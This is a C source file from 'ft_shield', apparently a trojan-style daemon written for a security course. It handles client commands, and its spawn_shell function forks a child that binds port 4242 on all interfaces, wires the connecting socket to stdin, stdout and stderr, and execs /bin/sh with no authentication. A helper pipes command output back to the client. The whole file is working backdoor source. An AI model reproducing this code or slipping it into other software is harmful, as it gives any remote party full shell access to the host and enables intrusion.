#include "ft_shield.h"

void print_usage(int client_fd)
{
	const char *usage =
		"ft_shield usage:\n"
		"  ?           : Show this help message.\n"
		"  shell       : Spawn a shell on port 4242.\n"
		"  users       : List currently logged in users.\n"
		"  system      : Display system information.\n"
		"  quit        : Exit the daemon.\n";

	send(client_fd, usage, strlen(usage), 0);
	display_prompt(client_fd);
}

void	spawn_shell(t_shield *daemon, int client_fd)
{
	char output[] = "Spawning shell on port 4242.\n";
	send(client_fd, output, strlen(output), 0);

	if (daemon->listen_fd != -1)
	{
		close(daemon->listen_fd);
		daemon->listen_fd = -1;
	}
	close_all_clients(daemon);

	pid_t shell_pid = fork();
	if (!shell_pid)
	{
		int shell_listen_fd = socket(AF_INET, SOCK_STREAM, 0);
		if (shell_listen_fd < 0)
			exit (EXIT_FAILURE);

		int opt = 1;
		setsockopt(shell_listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = INADDR_ANY;
		addr.sin_port = htons(PORT);

		if (bind(shell_listen_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0)
			exit (EXIT_FAILURE);
		if (listen(shell_listen_fd, 1) < 0)
		{
			close(shell_listen_fd);
			exit (EXIT_FAILURE);
		}
		int shell_client_fd = accept(shell_listen_fd, NULL, NULL);
		close(shell_listen_fd);

		dup2(shell_client_fd, STDIN_FILENO);
		dup2(shell_client_fd, STDOUT_FILENO);
		dup2(shell_client_fd, STDERR_FILENO);
		close(shell_client_fd);

		execl("/bin/sh", "sh", NULL);
		exit(EXIT_FAILURE);
	}
	else if (shell_pid > 0)
	{
		int status;
		waitpid(shell_pid, &status, 0);

		daemon->listen_fd = socket(AF_INET, SOCK_STREAM, 0);
		if (daemon->listen_fd >= 0)
		{
			int opt = 1;
			setsockopt(daemon->listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

			struct sockaddr_in addr;
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = INADDR_ANY;
			addr.sin_port = htons(PORT);

			if (!bind(daemon->listen_fd, (struct sockaddr*)&addr, sizeof(addr)))
				listen(daemon->listen_fd, 5);
		}
	}
	else
		setup_socket(daemon);
}

void	send_cmd_output(const char *cmd, int client_fd)
{
	FILE *fp;
	char buffer[BUFFER_SIZE];

	fp = popen(cmd, "r");
	if (!fp)
		return ;

	while (fgets(buffer, sizeof(buffer), fp))
		send(client_fd, buffer, strlen(buffer), 0);
	pclose(fp);
	send(client_fd, "\n", 1, 0);
}

void	display_prompt(int client_fd)
{
	const char *prompt = "-> ";
	send(client_fd, prompt, strlen(prompt), 0);
}
